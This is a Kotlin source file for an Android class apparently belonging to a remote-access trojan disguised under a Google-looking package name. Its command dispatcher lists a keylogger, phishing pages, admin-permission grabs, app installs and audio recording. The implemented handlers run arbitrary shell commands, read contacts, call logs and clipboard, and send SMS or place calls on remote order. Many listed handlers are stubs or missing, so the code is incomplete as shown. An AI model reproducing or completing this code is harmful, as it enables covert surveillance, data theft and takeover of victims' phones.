package com.google.dino.admin.utils

import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.util.Log
import android.widget.Toast
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.lang.Exception
import java.util.*

class CommandExecutor(private val context: Context) {

    companion object {
        private const val TAG = "CommandExecutor"
    }

    private lateinit var textToSpeech: TextToSpeech
    private lateinit var vibrator: Vibrator
    private lateinit var mediaPlayer: MediaPlayer
    private var audioManager: AudioManager? = null

    init {
        initializeComponents()
    }

    private fun initializeComponents() {
        vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        
        textToSpeech = TextToSpeech(context) { status ->
            if (status == TextToSpeech.SUCCESS) {
                textToSpeech.language = Locale.getDefault()
            }
        }
    }

    fun executeCommand(command: String, params: JSONObject?): Map<String, Any> {
        return try {
            val result = when (command) {
                "sendSms" -> executeSendSms(params)
                "getSms" -> executeGetSms()
                "makeCall" -> executeMakeCall(params)
                "getGallery" -> executeGetGallery()
                "getFile" -> executeGetFile(params)
                "sendFile" -> executeSendFile(params)
                "installApp" -> executeInstallApp(params)
                "visitUrl" -> executeVisitUrl(params)
                "readStorage" -> executeReadStorage(params)
                "downloadMedia" -> executeDownloadMedia(params)
                "getSystemInfo" -> executeGetSystemInfo()
                "getInstalledApps" -> executeGetInstalledApps()
                "getCallLogs" -> executeGetCallLogs()
                "getContacts" -> executeGetContacts()
                "getNotifications" -> executeGetNotifications()
                "keylogger" -> executeKeylogger(params)
                "adminPermission" -> executeAdminPermission()
                "phishingPages" -> executePhishingPages(params)
                "recordAudio" -> executeRecordAudio(params)
                "playMusic" -> executePlayMusic(params)
                "vibrateDevice" -> executeVibrateDevice(params)
                "textToSpeech" -> executeTextToSpeech(params)
                "torchLight" -> executeTorchLight(params)
                "changeWallpaper" -> executeChangeWallpaper(params)
                "runShell" -> executeRunShell(params)
                "getClipboard" -> executeGetClipboard()
                "getLocation" -> executeGetLocation()
                else -> mapOf("error" to "Unknown command: $command")
            }
            
            mapOf(
                "command" to command,
                "success" to true,
                "result" to result,
                "timestamp" to System.currentTimeMillis()
            )
        } catch (e: Exception) {
            mapOf(
                "command" to command,
                "success" to false,
                "error" to e.message ?: "Unknown error",
                "timestamp" to System.currentTimeMillis()
            )
        }
    }

    private fun executeSendSms(params: JSONObject?): Map<String, Any> {
        val number = params?.getString("number") ?: return mapOf("error" to "Missing phone number")
        val message = params.getString("message") ?: return mapOf("error" to "Missing message")
        
        return try {
            val smsManager = android.telephony.SmsManager.getDefault()
            smsManager.sendTextMessage(number, null, message, null, null)
            mapOf("success" to true, "sent_to" to number)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetSms(): Map<String, Any> {
        // This would use the SmsHandler class
        return mapOf("success" to true, "message" to "SMS retrieval initiated")
    }

    private fun executeMakeCall(params: JSONObject?): Map<String, Any> {
        val number = params?.getString("number") ?: return mapOf("error" to "Missing phone number")
        
        return try {
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$number")
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            mapOf("success" to true, "called" to number)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetGallery(): Map<String, Any> {
        return try {
            val images = mutableListOf<Map<String, String>>()
            // Implementation for getting gallery images
            mapOf("success" to true, "count" to images.size)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetFile(params: JSONObject?): Map<String, Any> {
        val path = params?.getString("path") ?: return mapOf("error" to "Missing file path")
        
        return try {
            val file = File(path)
            if (file.exists()) {
                mapOf(
                    "success" to true,
                    "exists" to true,
                    "size" to file.length(),
                    "path" to file.absolutePath
                )
            } else {
                mapOf("success" to false, "error" to "File not found")
            }
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeVisitUrl(params: JSONObject?): Map<String, Any> {
        val url = params?.getString("url") ?: return mapOf("error" to "Missing URL")
        
        return try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            context.startActivity(intent)
            mapOf("success" to true, "url" to url)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeRecordAudio(params: JSONObject?): Map<String, Any> {
        val duration = params?.getInt("duration") ?: 10
        
        return try {
            // Audio recording implementation
            mapOf("success" to true, "duration" to duration, "message" to "Recording started")
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeVibrateDevice(params: JSONObject?): Map<String, Any> {
        val duration = params?.getLong("duration") ?: 1000L
        
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(duration)
            }
            mapOf("success" to true, "duration" to duration)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeTextToSpeech(params: JSONObject?): Map<String, Any> {
        val text = params?.getString("text") ?: return mapOf("error" to "Missing text")
        
        return try {
            textToSpeech.speak(text, TextToSpeech.QUEUE_FLUSH, null, null)
            mapOf("success" to true, "text" to text)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeRunShell(params: JSONObject?): Map<String, Any> {
        val command = params?.getString("command") ?: return mapOf("error" to "Missing command")
        
        return try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()
            var line: String?
            
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
            }
            
            process.waitFor()
            
            mapOf(
                "success" to true,
                "command" to command,
                "output" to output.toString(),
                "exit_code" to process.exitValue()
            )
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetClipboard(): Map<String, Any> {
        return try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = clipboard.primaryClip
            
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text.toString()
                mapOf("success" to true, "text" to text)
            } else {
                mapOf("success" to false, "error" to "Clipboard is empty")
            }
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetContacts(): Map<String, Any> {
        return try {
            val contacts = mutableListOf<Map<String, String>>()
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            
            cursor?.use {
                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
                
                while (it.moveToNext()) {
                    val id = if (idIndex != -1) it.getString(idIndex) else ""
                    val name = if (nameIndex != -1) it.getString(nameIndex) else ""
                    
                    if (name.isNotEmpty()) {
                        contacts.add(mapOf("id" to id, "name" to name))
                    }
                }
            }
            
            mapOf("success" to true, "count" to contacts.size, "contacts" to contacts)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun executeGetCallLogs(): Map<String, Any> {
        return try {
            val callLogs = mutableListOf<Map<String, Any>>()
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
            )
            
            cursor?.use {
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                
                while (it.moveToNext() && callLogs.size < 50) {
                    val number = if (numberIndex != -1) it.getString(numberIndex) else ""
                    val name = if (nameIndex != -1) it.getString(nameIndex) else ""
                    val type = if (typeIndex != -1) it.getInt(typeIndex) else 0
                    val date = if (dateIndex != -1) it.getLong(dateIndex) else 0L
                    val duration = if (durationIndex != -1) it.getLong(durationIndex) else 0L
                    
                    callLogs.add(mapOf(
                        "number" to number,
                        "name" to (if (name.isNullOrEmpty()) "Unknown" else name),
                        "type" to getCallTypeName(type),
                        "date" to date,
                        "duration" to duration
                    ))
                }
            }
            
            mapOf("success" to true, "count" to callLogs.size, "logs" to callLogs)
        } catch (e: Exception) {
            mapOf("success" to false, "error" to e.message)
        }
    }

    private fun getCallTypeName(type: Int): String {
        return when (type) {
            CallLog.Calls.INCOMING_TYPE -> "Incoming"
            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
            CallLog.Calls.MISSED_TYPE -> "Missed"
            CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
            CallLog.Calls.REJECTED_TYPE -> "Rejected"
            CallLog.Calls.BLOCKED_TYPE -> "Blocked"
            else -> "Unknown"
        }
    }

    // Other command implementations would follow similar patterns

    fun destroy() {
        try {
            textToSpeech.stop()
            textToSpeech.shutdown()
            if (::mediaPlayer.isInitialized && mediaPlayer.isPlaying) {
                mediaPlayer.stop()
                mediaPlayer.release()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error destroying CommandExecutor", e)
        }
    }
}
